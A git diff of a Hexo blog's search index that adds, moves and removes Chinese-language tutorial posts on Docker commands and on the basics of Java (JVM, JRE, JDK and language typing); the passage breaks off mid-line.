+<td align="center">创建一个新的容器并运行一个命令</td>
+</tr>
+<tr>
+<td align="center">save</td>
+<td align="center">Save an image to a tar archive</td>
+<td align="center">保存一个镜像为一个 tar 包[对应 load]</td>
+</tr>
+<tr>
+<td align="center">search</td>
+<td align="center">Search for an image on the Docker Hub</td>
+<td align="center">在 docker hub 中搜索镜像</td>
+</tr>
+<tr>
+<td align="center">start</td>
+<td align="center">Start a stopped containers</td>
+<td align="center">启动容器</td>
+</tr>
+<tr>
+<td align="center">stop</td>
+<td align="center">Stop a running containers</td>
+<td align="center">停止容器</td>
+</tr>
+<tr>
+<td align="center">tag</td>
+<td align="center">Tag an image into a repository</td>
+<td align="center">给源中镜像打标签</td>
+</tr>
+<tr>
+<td align="center">top</td>
+<td align="center">Lookup the running processes of a container</td>
+<td align="center">查看容器中运行的进程信息</td>
+</tr>
+<tr>
+<td align="center">unpause</td>
+<td align="center">Unpause a paused container</td>
+<td align="center">取消暂停容器</td>
+</tr>
+<tr>
+<td align="center">version</td>
+<td align="center">Show the docker version information</td>
+<td align="center">查看 docker 版本号</td>
+</tr>
+<tr>
+<td align="center">wait</td>
+<td align="center">Block until a container stops，then print its exit code</td>
+<td align="center">截取容器止时的退出状态值</td>
+</tr>
+</tbody></table>
+]]></content>
+      <tags>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Docker相关部署</title>
     <url>/2023/07/31/Docker2/</url>
     <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
@@ -393,6 +632,48 @@
 ]]></content>
       <tags>
         <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java简介</title>
+    <url>/2023/07/26/Java1/</url>
+    <content><![CDATA[<h2 id="什么是Java"><a href="#什么是Java" class="headerlink" title="什么是Java"></a>什么是Java</h2><span id="more"></span>
+
+<p>Java是一门面向对象编程语言，不仅吸收了C++语言的各种优点，还摒弃了C++里难以理解的多继承、指针等概念，因此Java语言具有功能强大和简单易用两个特征。Java语言作为静态面向对象编程语言的代表，极好地实现了面向对象理论，允许程序员以优雅的思维方式进行复杂的编程 。</p>
+<h2 id="诞生背景"><a href="#诞生背景" class="headerlink" title="诞生背景"></a>诞生背景</h2><p>任职于Sun公司(Stanford University Network斯坦福网络公司)的詹姆斯·高斯林和麦克·舍林丹等人于1990年代初开发Java语言的雏形，最初被命名为Oak，Oak的目标是作为家用电器等小型系统的编程语言，用于电视机、电话、闹钟、烤面包机等家用电器的控制和通信。由于这些智能化家电的市场需求没有预期的高，Sun公司放弃了该项计划。随着1990年代互联网的发展，Sun公司发现Oak在互联网上应用的前景，于是改造了Oak，于1995年5月以Java的名称正式发布。伴随着互联网的迅猛发展，Java逐渐成为重要的网络编程语言。</p>
+<h2 id="语言特点与应用场景"><a href="#语言特点与应用场景" class="headerlink" title="语言特点与应用场景"></a>语言特点与应用场景</h2><p>Java语言具有简单性、面向对象、分布式、健壮性、安全性、跨平台性、可移植性、多线程与动态性等特点。Java语言可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统等 。Java 快速、安全、可靠。从笔记本电脑到数据中心，从游戏控制台到超级计算机，从手机到互联网，Java 无处不在！</p>
+<h2 id="JVM、JRE和JDK的关系"><a href="#JVM、JRE和JDK的关系" class="headerlink" title="JVM、JRE和JDK的关系"></a>JVM、JRE和JDK的关系</h2><h4 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h4><p>Java Virtual Machine是Java虚拟机，Java程序需要运行在虚拟机上，不同的平台有自己的虚拟机，因此Java语言可以实现跨平台。</p>
+<h4 id="JRE"><a href="#JRE" class="headerlink" title="JRE"></a>JRE</h4><p>Java Runtime Environment包括Java虚拟机和Java程序所需的核心类库等。核心类库主要是java.lang包：包含了运行Java程序必不可少的系统类，如基本数据类型、基本数学函数、字符串处理、线程、异常处理类等，系统缺省加载这个包</p>
+<p>如果想要运行一个开发好的Java程序，计算机中只需要安装JRE即可。</p>
+<h4 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h4><p>Java Development Kit是提供给Java开发人员使用的，其中包含了Java的开发工具，也包括了JRE。所以安装了JDK，就无需再单独安装JRE了。其中的开发工具：编译工具(javac.exe)，打包工具(jar.exe)等</p>
+<p>JVM&amp;JRE&amp;JDK关系图</p>
+<p><img src="https://img-blog.csdnimg.cn/20210430091557268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lhbmcxMzU2Mzc1ODEyOA==,size_16,color_FFFFFF,t_70" alt="img"></p>
+<h1 id="Java是编译型还是解释型语言"><a href="#Java是编译型还是解释型语言" class="headerlink" title="Java是编译型还是解释型语言"></a>Java是编译型还是解释型语言</h1><h3 id="1-编译型语言和解释型语言"><a href="#1-编译型语言和解释型语言" class="headerlink" title="1.编译型语言和解释型语言"></a>1.编译型语言和解释型语言</h3><h5 id="编译型语言"><a href="#编译型语言" class="headerlink" title="编译型语言"></a>编译型语言</h5><p><strong>定义</strong>：在程序运行之前，通过编译器将源程序编译成机器码(可运行的二进制代码)，以后执行这个程序时，就不用再进行编译了。</p>
+<p><strong>优点</strong>：编译器一般会有预编译的过程对代码进行优化。因为编译只做一次，运行时不需要编译，所以编译型语言的程序执行效率高，可以脱离语言环境独立运行。</p>
+<p><strong>缺点</strong>：编译之后如果需要修改就需要整个模块重新编译。编译的时候根据对应的运行环境生成机器码，不同的操作系统之间移植就会有问题，需要根据运行的操作系统环境编译不同的可执行文件。</p>
+<p><strong>总结</strong>：执行速度快、效率高；依靠编译器、跨平台性差些。</p>
+<p><strong>代表语言</strong>：C、C++、Pascal、Object-C以及Swift。</p>
+<h6 id="解释型语言"><a href="#解释型语言" class="headerlink" title="解释型语言"></a>解释型语言</h6><p><strong>定义</strong>：解释型语言的源代码不是直接翻译成机器码，而是先翻译成中间代码，再由解释器对中间代码进行解释运行。在运行的时候才将源程序翻译成机器码，翻译一句，然后执行一句，直至结束。</p>
+<p>优点：有良好的平台兼容性，在任何环境中都可以运行，前提是安装了解释器（虚拟机）。灵活，修改代码的时候直接修改就可以，可以快速部署，不用停机维护。</p>
+<p><strong>缺点</strong>：每次运行的时候都要解释一遍，性能上不如编译型语言。</p>
+<p><strong>总结</strong>：执行速度慢、效率低；依靠解释器、跨平台性好。</p>
+<p><strong>代表语言</strong>：JavaScript、Python、Erlang、PHP、Perl、Ruby。</p>
+<h5 id="混合型语言"><a href="#混合型语言" class="headerlink" title="混合型语言"></a>混合型语言</h5><p><strong>定义</strong>：既然编译型和解释型各有缺点就会有人想到把两种类型整合起来，取其精华去其糟粕，就出现了半编译，半解释型语言。</p>
+<p>比如C#，C#在编译的时候不是直接编译成机器码而是中间码，.NET平台提供了中间语言运行库运行中间码，中间语言运行库类似于Java虚拟机。.NET在编译成IL代码后，保存在dll中，首次运行时由JIT在编译成机器码缓存在内存中，下次直接执行。严格来说混合型语言属于解释型语言，C#更接近编译型语言。</p>
+<p><strong>Java即是编译型的，也是解释型语言，总的来说Java更接近解释型语言。</strong></p>
+<p>可以说它是编译型的。因为所有的Java代码都是要编译的，.java不经过编译就什么用都没有。同时围绕JVM的效率问题，会涉及一些如JIT、AOT等优化技术，例如JIT技术，会将热点代码编译成机器码。而AOT技术，是在运行前，通过工具直接将字节码转换为机器码。</p>
+<p>可以说它是解释型的。因为Java代码编译后不能直接运行，它是解释运行在JVM上的，所以它是解释运行的。</p>
+<h3 id="2-动态类型语言和静态类型语言"><a href="#2-动态类型语言和静态类型语言" class="headerlink" title="2.动态类型语言和静态类型语言"></a>2.动态类型语言和静态类型语言</h3><h6 id="动态类型语言"><a href="#动态类型语言" class="headerlink" title="动态类型语言"></a>动态类型语言</h6><p>动态类型语言：在运行期间才去做数据类型检查的语言，说的是数据类型。动态类型语言的数据类型不是在编译阶段决定的，而是把类型绑定延后到了运行阶段。</p>
+<p>代表语言：Python、Ruby、Erlang、JavaScript、Swift、PHP、Perl。</p>
+<h6 id="静态类型语言"><a href="#静态类型语言" class="headerlink" title="静态类型语言"></a>静态类型语言</h6><p>静态类型语言的数据类型是在编译期间（或运行之前）确定的，编写代码的时候要明确确定变量的数据类型。</p>
+<p>代表语言：C、C++、C#、Java、Object-C。</p>
+<h3 id="3-动态语言和静态语言"><a href="#3-动态语言和静态语言" class="headerlink" title="3.动态语言和静态语言"></a>3.动态语言和静态语言</h3><h5 id="动态语言"><a href="#动态语言" class="headerlink" title="动态语言"></a>动态语言</h5><p>动态类型语言和动态语言是完全不同的两个概念。</p>
+<p>动态语言：说的是运行时改变结构，说的是代码结构。在运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。</p>
+<p>代表语言：Object-C、C#、JavaScript、PHP、Python、Erlang。</p>
+<h5 id="静态语言"><a href="#静态语言" class="headerlink" title="静态语言"></a>静态语言</h5><p>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++。</p>
+]]></content>
+      <tags>
+        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
@@ -1816,48 +2097,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Java简介</title>
-    <url>/2023/07/26/Java1/</url>
-    <content><![CDATA[<h2 id="什么是Java"><a href="#什么是Java" class="headerlink" title="什么是Java"></a>什么是Java</h2><span id="more"></span>
-
-<p>Java是一门面向对象编程语言，不仅吸收了C++语言的各种优点，还摒弃了C++里难以理解的多继承、指针等概念，因此Java语言具有功能强大和简单易用两个特征。Java语言作为静态面向对象编程语言的代表，极好地实现了面向对象理论，允许程序员以优雅的思维方式进行复杂的编程 。</p>
-<h2 id="诞生背景"><a href="#诞生背景" class="headerlink" title="诞生背景"></a>诞生背景</h2><p>任职于Sun公司(Stanford University Network斯坦福网络公司)的詹姆斯·高斯林和麦克·舍林丹等人于1990年代初开发Java语言的雏形，最初被命名为Oak，Oak的目标是作为家用电器等小型系统的编程语言，用于电视机、电话、闹钟、烤面包机等家用电器的控制和通信。由于这些智能化家电的市场需求没有预期的高，Sun公司放弃了该项计划。随着1990年代互联网的发展，Sun公司发现Oak在互联网上应用的前景，于是改造了Oak，于1995年5月以Java的名称正式发布。伴随着互联网的迅猛发展，Java逐渐成为重要的网络编程语言。</p>
-<h2 id="语言特点与应用场景"><a href="#语言特点与应用场景" class="headerlink" title="语言特点与应用场景"></a>语言特点与应用场景</h2><p>Java语言具有简单性、面向对象、分布式、健壮性、安全性、跨平台性、可移植性、多线程与动态性等特点。Java语言可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统等 。Java 快速、安全、可靠。从笔记本电脑到数据中心，从游戏控制台到超级计算机，从手机到互联网，Java 无处不在！</p>
-<h2 id="JVM、JRE和JDK的关系"><a href="#JVM、JRE和JDK的关系" class="headerlink" title="JVM、JRE和JDK的关系"></a>JVM、JRE和JDK的关系</h2><h4 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h4><p>Java Virtual Machine是Java虚拟机，Java程序需要运行在虚拟机上，不同的平台有自己的虚拟机，因此Java语言可以实现跨平台。</p>
-<h4 id="JRE"><a href="#JRE" class="headerlink" title="JRE"></a>JRE</h4><p>Java Runtime Environment包括Java虚拟机和Java程序所需的核心类库等。核心类库主要是java.lang包：包含了运行Java程序必不可少的系统类，如基本数据类型、基本数学函数、字符串处理、线程、异常处理类等，系统缺省加载这个包</p>
-<p>如果想要运行一个开发好的Java程序，计算机中只需要安装JRE即可。</p>
-<h4 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h4><p>Java Development Kit是提供给Java开发人员使用的，其中包含了Java的开发工具，也包括了JRE。所以安装了JDK，就无需再单独安装JRE了。其中的开发工具：编译工具(javac.exe)，打包工具(jar.exe)等</p>
-<p>JVM&amp;JRE&amp;JDK关系图</p>
-<p><img src="https://img-blog.csdnimg.cn/20210430091557268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lhbmcxMzU2Mzc1ODEyOA==,size_16,color_FFFFFF,t_70" alt="img"></p>
-<h1 id="Java是编译型还是解释型语言"><a href="#Java是编译型还是解释型语言" class="headerlink" title="Java是编译型还是解释型语言"></a>Java是编译型还是解释型语言</h1><h3 id="1-编译型语言和解释型语言"><a href="#1-编译型语言和解释型语言" class="headerlink" title="1.编译型语言和解释型语言"></a>1.编译型语言和解释型语言</h3><h5 id="编译型语言"><a href="#编译型语言" class="headerlink" title="编译型语言"></a>编译型语言</h5><p><strong>定义</strong>：在程序运行之前，通过编译器将源程序编译成机器码(可运行的二进制代码)，以后执行这个程序时，就不用再进行编译了。</p>
-<p><strong>优点</strong>：编译器一般会有预编译的过程对代码进行优化。因为编译只做一次，运行时不需要编译，所以编译型语言的程序执行效率高，可以脱离语言环境独立运行。</p>
-<p><strong>缺点</strong>：编译之后如果需要修改就需要整个模块重新编译。编译的时候根据对应的运行环境生成机器码，不同的操作系统之间移植就会有问题，需要根据运行的操作系统环境编译不同的可执行文件。</p>
-<p><strong>总结</strong>：执行速度快、效率高；依靠编译器、跨平台性差些。</p>
-<p><strong>代表语言</strong>：C、C++、Pascal、Object-C以及Swift。</p>
-<h6 id="解释型语言"><a href="#解释型语言" class="headerlink" title="解释型语言"></a>解释型语言</h6><p><strong>定义</strong>：解释型语言的源代码不是直接翻译成机器码，而是先翻译成中间代码，再由解释器对中间代码进行解释运行。在运行的时候才将源程序翻译成机器码，翻译一句，然后执行一句，直至结束。</p>
-<p>优点：有良好的平台兼容性，在任何环境中都可以运行，前提是安装了解释器（虚拟机）。灵活，修改代码的时候直接修改就可以，可以快速部署，不用停机维护。</p>
-<p><strong>缺点</strong>：每次运行的时候都要解释一遍，性能上不如编译型语言。</p>
-<p><strong>总结</strong>：执行速度慢、效率低；依靠解释器、跨平台性好。</p>
-<p><strong>代表语言</strong>：JavaScript、Python、Erlang、PHP、Perl、Ruby。</p>
-<h5 id="混合型语言"><a href="#混合型语言" class="headerlink" title="混合型语言"></a>混合型语言</h5><p><strong>定义</strong>：既然编译型和解释型各有缺点就会有人想到把两种类型整合起来，取其精华去其糟粕，就出现了半编译，半解释型语言。</p>
-<p>比如C#，C#在编译的时候不是直接编译成机器码而是中间码，.NET平台提供了中间语言运行库运行中间码，中间语言运行库类似于Java虚拟机。.NET在编译成IL代码后，保存在dll中，首次运行时由JIT在编译成机器码缓存在内存中，下次直接执行。严格来说混合型语言属于解释型语言，C#更接近编译型语言。</p>
-<p><strong>Java即是编译型的，也是解释型语言，总的来说Java更接近解释型语言。</strong></p>
-<p>可以说它是编译型的。因为所有的Java代码都是要编译的，.java不经过编译就什么用都没有。同时围绕JVM的效率问题，会涉及一些如JIT、AOT等优化技术，例如JIT技术，会将热点代码编译成机器码。而AOT技术，是在运行前，通过工具直接将字节码转换为机器码。</p>
-<p>可以说它是解释型的。因为Java代码编译后不能直接运行，它是解释运行在JVM上的，所以它是解释运行的。</p>
-<h3 id="2-动态类型语言和静态类型语言"><a href="#2-动态类型语言和静态类型语言" class="headerlink" title="2.动态类型语言和静态类型语言"></a>2.动态类型语言和静态类型语言</h3><h6 id="动态类型语言"><a href="#动态类型语言" class="headerlink" title="动态类型语言"></a>动态类型语言</h6><p>动态类型语言：在运行期间才去做数据类型检查的语言，说的是数据类型。动态类型语言的数据类型不是在编译阶段决定的，而是把类型绑定延后到了运行阶段。</p>
-<p>代表语言：Python、Ruby、Erlang、JavaScript、Swift、PHP、Perl。</p>
-<h6 id="静态类型语言"><a href="#静态类型语言" class="headerlink" title="静态类型语言"></a>静态类型语言</h6><p>静态类型语言的数据类型是在编译期间（或运行之前）确定的，编写代码的时候要明确确定变量的数据类型。</p>
-<p>代表语言：C、C++、C#、Java、Object-C。</p>
-<h3 id="3-动态语言和静态语言"><a href="#3-动态语言和静态语言" class="headerlink" title="3.动态语言和静态语言"></a>3.动态语言和静态语言</h3><h5 id="动态语言"><a href="#动态语言" class="headerlink" title="动态语言"></a>动态语言</h5><p>动态类型语言和动态语言是完全不同的两个概念。</p>
-<p>动态语言：说的是运行时改变结构，说的是代码结构。在运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。</p>
-<p>代表语言：Object-C、C#、JavaScript、PHP、Python、Erlang。</p>
-<h5 id="静态语言"><a href="#静态语言" class="headerlink" title="静态语言"></a>静态语言</h5><p>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++。</p>
-]]></content>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTML</title>
     <url>/2023/08/08/HTML/</url>
     <content><![CDATA[<h1 id="html基本元素标签"><a href="#html基本元素标签" class="headerlink" title="html基本元素标签"></a>html基本元素标签</h1><span id="more"></span>
@@ -1936,242 +2175,305 @@
       </tags>
   </entry>
   <entry>
-    <title>Docker命令</title>
-    <url>/2023/07/31/Docker%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h1 id="Docker的常用命令"><a href="#Docker的常用命令" class="headerlink" title="Docker的常用命令"></a>Docker的常用命令</h1><span id="more"></span>
+    <title>Java面向对象</title>
+    <url>/2023/07/27/Java3/</url>
+    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
 
-<h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version      #显示docker的版本信息</span><br><span class="line">docker info            #显示docker的系统信息，包括境像和容器的数量</span><br><span class="line">docker 命令 --help# 帮助命令</span><br><span class="line"></span><br><span class="line">帮助文档的地址：https://docs.docker.com/engine/reference/commandline</span><br></pre></td></tr></table></figure>
-
-<h2 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images 查看所有本地的主机上的镜像</span><br><span class="line">[root@xxx /]# docker images</span><br><span class="line">REPOSITORY			TAG	    	IMAGE ID		      CREATED	         	SIZE</span><br><span class="line">he11o-world			Tatest		bf756fblae65		4 months ago		13.3kB</span><br><span class="line"></span><br><span class="line">解释</span><br><span class="line">REPOSITORY    镜像的仓库源</span><br><span class="line">TAG		      	 镜像的标签</span><br><span class="line">IMAGE ID		  镜像的id</span><br><span class="line">CREATED		  镜像的创建时间</span><br><span class="line">SIZE					镜像的大小</span><br><span class="line"></span><br><span class="line">#可选项</span><br><span class="line">-a，--all						   列出所有镜像</span><br><span class="line">-q，--quiet  				    只显示ID</span><br></pre></td></tr></table></figure>
-
-<h3 id="docker-search-搜索镜像"><a href="#docker-search-搜索镜像" class="headerlink" title="docker search 搜索镜像"></a>docker search 搜索镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@xxx /]# docker search mysql</span><br><span class="line">NAME                            DESCRIPTION                                                    STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                 MySQL is a widely used, open-source relation…    14338        [OK]       </span><br><span class="line">mariadb             MariaDB Server is a high performing open sou…   5474         [OK]       </span><br><span class="line"></span><br><span class="line">#可选项，通过搜藏来过滤</span><br><span class="line">--filter=STARS=3000# 搜索出来的镜像就是STARS大于3000的</span><br><span class="line"></span><br><span class="line">[root@xxx ~]# docker search mysql --filter=STARS=3000</span><br><span class="line">NAME        					 DESCRIPTION                              			  STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql     MySQL is a widely used, open-source relation…   	14338     [OK]       </span><br><span class="line">mariadb   MariaDB Server is a high performing open sou…    5474      [OK]       </span><br></pre></td></tr></table></figure>
-
-<h3 id="拉取镜像docker-pull-镜像名-tag"><a href="#拉取镜像docker-pull-镜像名-tag" class="headerlink" title="拉取镜像docker pull 镜像名[:tag]"></a><strong>拉取镜像docker pull 镜像名[:tag]</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@163 ~]# docker pull mysql</span><br><span class="line">Using default tag: latest  #如果不写tag，默认最新版本</span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Pull complete 		#分层下载，docker  image的核心  联合文件系统</span><br><span class="line">93619dbc5b36: Pull complete </span><br><span class="line">99da31dd6142: Pull complete </span><br><span class="line">626033c43d70: Pull complete </span><br><span class="line">37d5d7efb64e: Pull complete </span><br><span class="line">ac563158d721: Pull complete </span><br><span class="line">d2ba16033dad: Pull complete </span><br><span class="line">688ba7d5c01a: Pull complete </span><br><span class="line">00e060b6d11d: Pull complete </span><br><span class="line">1c04857f594f: Pull complete </span><br><span class="line">4d7cfa90e6ea: Pull complete </span><br><span class="line">e0431212d27d: Pull complete </span><br><span class="line">Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709  #签名</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br><span class="line">docker.io/library/mysql:latest	#真实地址</span><br><span class="line"></span><br><span class="line">*docker pull mysql等价于docker pull docker.io/library/mysql:latest</span><br><span class="line"></span><br><span class="line">*docker pull mysql:5.7</span><br><span class="line">[root@163 ~]# docker pull mysql:5.7</span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Already exists </span><br><span class="line">93619dbc5b36: Already exists </span><br><span class="line">99da31dd6142: Already exists </span><br><span class="line">626033c43d70: Already exists </span><br><span class="line">37d5d7efb64e: Already exists </span><br><span class="line">ac563158d721: Already exists </span><br><span class="line">d2ba16033dad: Already exists //以上为重复部分</span><br><span class="line">0ceb82207cd7: Pull complete </span><br><span class="line">37f2405cae96: Pull complete </span><br><span class="line">e2482e017e53: Pull complete </span><br><span class="line">70deed891d42: Pull complete </span><br><span class="line">Digest: sha256:f2ad209efe9c67104167fc609cca6973c8422939491c9345270175a300419f94</span><br><span class="line">Status: Downloaded newer image for mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7</span><br></pre></td></tr></table></figure>
-
-<h3 id="删除镜像docker-rmi"><a href="#删除镜像docker-rmi" class="headerlink" title="删除镜像docker rmi"></a>删除镜像docker rmi</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rmi -f   镜像ID			 //删除指定镜像</span><br><span class="line"></span><br><span class="line">docker rmi -f   镜像ID 镜像ID 镜像ID //删除多个镜像</span><br><span class="line"></span><br><span class="line">docker rmi -f  $(docker images -aq)	  //删除所有镜像</span><br></pre></td></tr></table></figure>
-
-<h2 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h2><p><strong>说明:我们有了镜像才可以创建容器，linux，下载一个 centos 镜像来测试学习</strong><br>docker pull centos</p>
-<h3 id="新建容器并启动"><a href="#新建容器并启动" class="headerlink" title="新建容器并启动"></a>新建容器并启动</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run [可选参数] image</span><br><span class="line"></span><br><span class="line">#参数说明</span><br><span class="line">--name=&quot;Name&quot;		   容器名字 tomcat01 tomcat02，用来区分容器</span><br><span class="line">-d									后台方式运行</span><br><span class="line">-it									使用交互方式运行，进入容器查看内容</span><br><span class="line"></span><br><span class="line">-p								   指定容器的端口-p  8080:8080</span><br><span class="line"></span><br><span class="line">     	 	-p ip:主机端口:容器端口</span><br><span class="line">			-p 主机端口:容器端口 (常用)</span><br><span class="line">			-p 容器端口</span><br><span class="line">			容器端口</span><br><span class="line"></span><br><span class="line">-P								   随机指定端口</span><br><span class="line"></span><br><span class="line">#测试，启动并进入容器</span><br><span class="line"></span><br><span class="line">[root@xxx ~]# docker run -it centos /bin/bash</span><br><span class="line"></span><br><span class="line">[root@c0eed8b69c30 /]# ls   //查看容器内的centos,基础版本，很多命令都不完善</span><br><span class="line">bin  etc   lib	  lost+found  mnt  proc  run   srv  tmp  var	</span><br><span class="line">dev  home  lib64  media       opt  root  sbin  sys  usr</span><br><span class="line"></span><br><span class="line">exit		//从容器中退回主机</span><br></pre></td></tr></table></figure>
-
-<h3 id="列出所有运行的容器"><a href="#列出所有运行的容器" class="headerlink" title="列出所有运行的容器"></a>列出所有运行的容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#docker ps 命令</span><br><span class="line">     	列出当前正在运行的容器</span><br><span class="line"></span><br><span class="line">-a 		//列出当前正在运行的容器+带出历史运行过的容器</span><br><span class="line">-n=? 	// 显示最近创建的容器</span><br><span class="line">-q		//只显示容器的编号</span><br></pre></td></tr></table></figure>
-
-<h3 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit 				   //直接容器停止并退出  </span><br><span class="line"></span><br><span class="line">Ctrl + P + Q 	//容不停止退出</span><br></pre></td></tr></table></figure>
-
-<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm 容器id		//删除指定的容器，不能除正在运行的容器，如果要强制刚除 rm -f</span><br><span class="line">docker rm -f $(docker ps -aq)		//删除所有的容器</span><br><span class="line">docker ps -a -q|xargs docker rm 		// 删除所有的容器</span><br></pre></td></tr></table></figure>
-
-<h3 id="启动和停止容器的操作"><a href="#启动和停止容器的操作" class="headerlink" title="启动和停止容器的操作"></a>启动和停止容器的操作</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start 容器id			启动容器</span><br><span class="line">docker restart 容器id		重启容器</span><br><span class="line">docker stop 容器id			停止当前正在运行的容器</span><br><span class="line">docker kill 容器id			  强制停止当前容器</span><br></pre></td></tr></table></figure>
-
-<h2 id="常用其他命令"><a href="#常用其他命令" class="headerlink" title="常用其他命令"></a>常用其他命令</h2><p><strong>后台启动容器</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#命令 docker run -d 镜像名!</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker run -d centos</span><br><span class="line"></span><br><span class="line">#问题docker ps，发现 centos 停止了</span><br><span class="line"></span><br><span class="line">#常见的坑:docker 容器使用后台运行，就必须要有要一个前台进程，docker发现没有应用，就会自动停止</span><br><span class="line"></span><br><span class="line">#nginx，容器启动后，发现自己没有提供服务，就会立刻停止，就是没有程序了</span><br></pre></td></tr></table></figure>
-
-<p><strong>查看日志</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs -f -t --tail 容器，没有日志</span><br><span class="line"></span><br><span class="line">#自己编写一段shell脚本</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker run -d centos /bin/sh -c &quot;while true;do echo hhhhhh;sleep 1;done&quot;</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker ps</span><br><span class="line"></span><br><span class="line">CONTAINER ID			IMAGE</span><br><span class="line">dce7b86171bf			centos</span><br><span class="line"></span><br><span class="line">#显示日志</span><br><span class="line"></span><br><span class="line">-tf								//显示日志</span><br><span class="line"></span><br><span class="line">--tai1 number			//要显示日志条数</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker logs -tf --tai1 10 dce7b86171bf</span><br></pre></td></tr></table></figure>
-
-<p><strong>查看容器中进程信息</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#docker ps</span><br><span class="line">#命令docker top 容器id</span><br><span class="line">UID                 PID                 PPID        	    C                 STIME       </span><br><span class="line">root                1432624             1432594             0                   20:14     </span><br><span class="line">root                1452486             1432624             0                   20:20     </span><br></pre></td></tr></table></figure>
-
-<p><strong>查看镜像的元数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#命令 docker inspect 容器id</span><br></pre></td></tr></table></figure>
-
-<p><strong>进入当前正在运行的容器</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式一：docker exec -it 容器id /bin/bash		//进入容器后开启一个新的终端，可以在里面操作</span><br><span class="line"></span><br><span class="line">方式二：docker attach 容器id		 				 //进入容器正在执行的终端，不会启动新的进程</span><br></pre></td></tr></table></figure>
-
-<p><strong>从容器内拷贝文件到主机上</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker  cp 容器id:容器内路径  目的的主机路径</span><br><span class="line"></span><br><span class="line">#查看当将主机目录下</span><br><span class="line"></span><br><span class="line">[root@163 home]# ls</span><br><span class="line">hhh.java  redis  www</span><br><span class="line">[root@163 home]#  docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">69687a39e545   centos    &quot;/bin/bash&quot;   2 minutes ago   Up 2 minutes             vigilant_blackburn</span><br><span class="line"></span><br><span class="line">#进入docker容器内部</span><br><span class="line"></span><br><span class="line">[root@163 home]# docker attach 69687a39e545</span><br><span class="line">[root@69687a39e545 /]# cd /home</span><br><span class="line">[root@69687a39e545 home]# ls</span><br><span class="line"></span><br><span class="line">#在容器内新建一个文件</span><br><span class="line"></span><br><span class="line">[root@69687a39e545 home]# touch test.java</span><br><span class="line">[root@69687a39e545 home]# exit</span><br><span class="line">exit</span><br><span class="line">[root@163 home]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">[root@163 home]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS                      PORTS     NAMES</span><br><span class="line">69687a39e545   centos    &quot;/bin/bash&quot;   4 minutes ago   Exited (0) 31 seconds ago             vigilant_blackburn</span><br><span class="line"></span><br><span 